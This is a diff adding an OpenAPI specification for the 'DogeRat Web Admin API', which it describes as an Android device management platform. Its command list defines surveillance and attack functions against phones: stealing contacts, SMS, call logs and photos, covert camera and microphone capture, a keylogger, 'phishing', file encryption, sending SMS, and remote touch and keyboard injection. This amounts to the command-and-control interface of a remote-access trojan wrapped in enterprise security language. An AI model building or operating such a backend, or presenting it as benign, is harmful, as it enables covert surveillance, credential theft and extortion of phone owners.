@@ -1,0 +1,736 @@
+openapi: 3.1.0
+info:
+  title: DogeRat Web Admin API
+  version: 3.1.0
+  description: |
+    **Production-Ready Android Device Management Platform**
+    
+    This API provides secure, traceable, and idempotent remote device management capabilities.
+    
+    ## Key Features
+    - 🔐 JWT Authentication with RBAC
+    - 🔄 Idempotent commands with request_id
+    - 📊 Real-time command status tracking (QUEUED → RUNNING → SUCCEEDED/FAILED)
+    - 🔍 Complete audit trail for all operations
+    - ⚡ SSE/WebSocket for real-time updates
+    - 🛡️ Rate limiting and input validation
+    
+    ## Security
+    - All endpoints require Bearer token authentication (except /auth/login)
+    - Role-based access control (Admin, Manager, Operator, Viewer)
+    - Audit logging for all state-changing operations
+    - Input validation on all endpoints
+    
+    ## Idempotency
+    All mutating operations accept an optional `request_id` (UUID) header for idempotency.
+    If a request with the same `request_id` is received again, the server returns the 
+    cached response instead of re-executing the operation.
+    
+  contact:
+    name: DogeRat Team
+    email: security@dogerat.com
+  license:
+    name: MIT
+    url: https://opensource.org/licenses/MIT
+
+servers:
+  - url: http://localhost:5000
+    description: Development server
+  - url: https://api.dogerat.com
+    description: Production server (with Zero-Trust gateway)
+
+tags:
+  - name: Authentication
+    description: User authentication and authorization
+  - name: Devices
+    description: Device management and remote control
+  - name: Commands
+    description: Command execution and status tracking
+  - name: Users
+    description: User management (Admin only)
+  - name: Audit
+    description: Audit trail and security logs
+  - name: Health
+    description: Health checks and monitoring
+
+security:
+  - bearerAuth: []
+
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+      description: |
+        JWT token obtained from /auth/login endpoint.
+        Format: `Bearer <token>`
+
+  parameters:
+    requestId:
+      name: X-Request-ID
+      in: header
+      description: |
+        UUID for idempotent operations. If provided, the server will ensure
+        the operation is executed only once, even if the request is repeated.
+      required: false
+      schema:
+        type: string
+        format: uuid
+      example: "550e8400-e29b-41d4-a716-446655440000"
+
+  schemas:
+    User:
+      type: object
+      properties:
+        id:
+          type: string
+          format: uuid
+        username:
+          type: string
+          minLength: 3
+          maxLength: 50
+        email:
+          type: string
+          format: email
+        role:
+          type: string
+          enum: [admin, manager, operator, viewer]
+          description: |
+            - admin: Full access including user management
+            - manager: Read-only access to all resources
+            - operator: Can execute device commands
+            - viewer: Read-only access to devices
+        created_at:
+          type: string
+          format: date-time
+        updated_at:
+          type: string
+          format: date-time
+        last_login_at:
+          type: string
+          format: date-time
+          nullable: true
+
+    Device:
+      type: object
+      properties:
+        id:
+          type: string
+          format: uuid
+        socket_id:
+          type: string
+          description: Socket.IO connection ID
+        device_id:
+          type: string
+          description: Android device unique identifier
+        model:
+          type: string
+        version:
+          type: string
+          description: Android version
+        ip:
+          type: string
+          format: ipv4
+        user_agent:
+          type: string
+          nullable: true
+        last_seen_at:
+          type: string
+          format: date-time
+          nullable: true
+        owner_user_id:
+          type: string
+          format: uuid
+          nullable: true
+        created_at:
+          type: string
+          format: date-time
+        updated_at:
+          type: string
+          format: date-time
+        isOnline:
+          type: boolean
+
+    Command:
+      type: object
+      properties:
+        id:
+          type: string
+          format: uuid
+        device_id:
+          type: string
+          format: uuid
+        command:
+          type: string
+          enum:
+            - contacts
+            - sms
+            - calls
+            - gallery
+            - main-camera
+            - selfie-camera
+            - microphone
+            - screenshot
+            - toast
+            - vibrate
+            - play-audio
+            - stop-audio
+            - clipboard
+            - sendSms
+            - keylogger-on
+            - keylogger-off
+            - open-url
+            - phishing
+            - encrypt
+            - decrypt
+            - apps
+            - file-explorer
+            - all-sms
+            - popNotification
+            - start-screen-stream
+            - stop-screen-stream
+            - touch-event
+            - keyboard-event
+        params:
+          type: object
+          description: Command-specific parameters
+        status:
+          type: string
+          enum: [queued, pending, running, succeeded, failed, ok, error, timeout]
+          description: |
+            Command execution status:
+            - queued: Command created but not sent to device yet
+            - pending: Sent to device, awaiting execution
+            - running: Currently executing on device
+            - succeeded: Command completed successfully
+            - failed: Command execution failed
+            - timeout: Command timed out
+        response:
+          type: object
+          nullable: true
+          description: Response data from device (if any)
+        error_message:
+          type: string
+          nullable: true
+        created_by:
+          type: string
+          format: uuid
+        created_at:
+          type: string
+          format: date-time
+        updated_at:
+          type: string
+          format: date-time
+        executed_at:
+          type: string
+          format: date-time
+          nullable: true
+        request_id:
+          type: string
+          format: uuid
+          nullable: true
+          description: Idempotency key
+        retry_count:
+          type: integer
+          minimum: 0
+          description: Number of retry attempts
+
+    AuditTrail:
+      type: object
+      properties:
+        id:
+          type: string
+          format: uuid
+        user_id:
+          type: string
+          format: uuid
+        action:
+          type: string
+          description: Action performed (e.g., "user.create", "command.execute")
+        target_id:
+          type: string
+          nullable: true
+        target_type:
+          type: string
+          nullable: true
+        metadata:
+          type: object
+          description: Additional context about the action
+        ip_address:
+          type: string
+          format: ipv4
+          nullable: true
+        user_agent:
+          type: string
+          nullable: true
+        timestamp:
+          type: string
+          format: date-time
+
+    Error:
+      type: object
+      properties:
+        error:
+          type: string
+          description: Error type/code
+        message:
+          type: string
+          description: Human-readable error message
+        details:
+          type: array
+          items:
+            type: object
+          description: Additional error details (e.g., validation errors)
+        request_id:
+          type: string
+          format: uuid
+          description: Request ID for tracing
+
+    HealthStatus:
+      type: object
+      properties:
+        status:
+          type: string
+          enum: [healthy, degraded, unhealthy]
+        timestamp:
+          type: string
+          format: date-time
+        version:
+          type: string
+        uptime:
+          type: integer
+          description: Server uptime in seconds
+        database:
+          type: object
+          properties:
+            connected:
+              type: boolean
+            latency_ms:
+              type: number
+        socketio:
+          type: object
+          properties:
+            connected_clients:
+              type: integer
+
+paths:
+  /api/auth/login:
+    post:
+      tags:
+        - Authentication
+      summary: User login
+      description: Authenticate user and receive JWT token
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - username
+                - password
+              properties:
+                username:
+                  type: string
+                  minLength: 3
+                password:
+                  type: string
+                  minLength: 6
+      responses:
+        '200':
+          description: Login successful
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                  token:
+                    type: string
+                    description: JWT token (valid for 24 hours)
+                  user:
+                    $ref: '#/components/schemas/User'
+        '401':
+          description: Invalid credentials
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+        '429':
+          description: Too many requests (rate limited)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/auth/me:
+    get:
+      tags:
+        - Authentication
+      summary: Get current user
+      description: Returns information about the currently authenticated user
+      responses:
+        '200':
+          description: User information
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  user:
+                    $ref: '#/components/schemas/User'
+        '401':
+          description: Not authenticated
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/devices:
+    get:
+      tags:
+        - Devices
+      summary: List all devices
+      description: Returns a list of all registered devices with their current status
+      parameters:
+        - name: status
+          in: query
+          description: Filter by online status
+          schema:
+            type: string
+            enum: [online, offline, all]
+        - name: page
+          in: query
+          schema:
+            type: integer
+            minimum: 1
+            default: 1
+        - name: limit
+          in: query
+          schema:
+            type: integer
+            minimum: 1
+            maximum: 100
+            default: 50
+      responses:
+        '200':
+          description: List of devices
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  devices:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/Device'
+                  total:
+                    type: integer
+                  page:
+                    type: integer
+                  limit:
+                    type: integer
+
+  /api/devices/{deviceId}:
+    get:
+      tags:
+        - Devices
+      summary: Get device details
+      parameters:
+        - name: deviceId
+          in: path
+          required: true
+          schema:
+            type: string
+            format: uuid
+      responses:
+        '200':
+          description: Device details
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  device:
+                    $ref: '#/components/schemas/Device'
+
+  /api/devices/{deviceId}/command:
+    post:
+      tags:
+        - Commands
+      summary: Send command to device (idempotent)
+      description: |
+        Sends a command to the specified device. This operation is idempotent
+        when X-Request-ID header is provided.
+      parameters:
+        - name: deviceId
+          in: path
+          required: true
+          schema:
+            type: string
+            format: uuid
+        - $ref: '#/components/parameters/requestId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - command
+              properties:
+                command:
+                  type: string
+                  description: Command type to execute
+                params:
+                  type: object
+                  description: Command-specific parameters
+                request_id:
+                  type: string
+                  format: uuid
+                  description: |
+                    Optional idempotency key. Can be provided in request body
+                    or X-Request-ID header. If both are provided, header takes precedence.
+            examples:
+              toast:
+                summary: Display toast message
+                value:
+                  command: toast
+                  params:
+                    message: "Hello from server"
+                  request_id: "550e8400-e29b-41d4-a716-446655440000"
+              screenshot:
+                summary: Take screenshot
+                value:
+                  command: screenshot
+                  params: {}
+              contacts:
+                summary: Get contacts
+                value:
+                  command: contacts
+                  params: {}
+      responses:
+        '200':
+          description: Command queued successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                  command:
+                    $ref: '#/components/schemas/Command'
+        '409':
+          description: |
+            Duplicate request - command already executed with this request_id.
+            Returns the original command result.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                  command:
+                    $ref: '#/components/schemas/Command'
+                  duplicate:
+                    type: boolean
+                    enum: [true]
+
+  /api/commands/{commandId}:
+    get:
+      tags:
+        - Commands
+      summary: Get command status
+      description: Returns the current status and result of a command
+      parameters:
+        - name: commandId
+          in: path
+          required: true
+          schema:
+            type: string
+            format: uuid
+      responses:
+        '200':
+          description: Command details
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  command:
+                    $ref: '#/components/schemas/Command'
+
+  /api/commands/stream:
+    get:
+      tags:
+        - Commands
+      summary: Stream command status updates (SSE)
+      description: |
+        Server-Sent Events endpoint for real-time command status updates.
+        Connect to receive updates whenever any command status changes.
+      responses:
+        '200':
+          description: SSE stream
+          content:
+            text/event-stream:
+              schema:
+                type: object
+                properties:
+                  event:
+                    type: string
+                    enum: [command-update, command-completed, command-failed]
+                  data:
+                    $ref: '#/components/schemas/Command'
+
+  /api/users:
+    get:
+      tags:
+        - Users
+      summary: List all users (Admin only)
+      description: Returns a list of all users in the system
+      responses:
+        '200':
+          description: List of users
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  users:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/User'
+        '403':
+          description: Insufficient permissions
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+    post:
+      tags:
+        - Users
+      summary: Create new user (Admin only)
+      parameters:
+        - $ref: '#/components/parameters/requestId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - username
+                - email
+                - password
+                - role
+              properties:
+                username:
+                  type: string
+                  minLength: 3
+                  maxLength: 50
+                email:
+                  type: string
+                  format: email
+                password:
+                  type: string
+                  minLength: 6
+                role:
+                  type: string
+                  enum: [admin, manager, operator, viewer]
+      responses:
+        '201':
+          description: User created successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                  user:
+                    $ref: '#/components/schemas/User'
+
+  /api/audit:
+    get:
+      tags:
+        - Audit
+      summary: Get audit trail (Admin/Manager only)
+      description: Returns audit logs with filtering and pagination
+      parameters:
+        - name: user_id
+          in: query
+          schema:
+            type: string
+            format: uuid
+        - name: action
+          in: query
+          schema:
+            type: string
+        - name: start_date
+          in: query
+          schema:
+            type: string
+            format: date-time
+        - name: end_date
+          in: query
+          schema:
+            type: string
+            format: date-time
+        - name: page
+          in: query
+          schema:
+            type: integer
+            minimum: 1
+            default: 1
+        - name: limit
+          in: query
+          schema:
+            type: integer
+            minimum: 1
+            maximum: 100
+            default: 50
+      responses:
+        '200':
+          description: Audit trail entries
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  logs:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/AuditTrail'
+                  total:
+                    type: integer
+                  page:
+                    type: integer
+                  limit:
+                    type: integer
+
+  /api/health:
+    get:
+      tags:
+        - Health
+      summary: Health check
+      description: Returns server health status and metrics
+      security: []
+      responses:
+        '200':
+          description: Server is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthStatus'
+        '503':
+          description: Server is unhealthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthStatus'
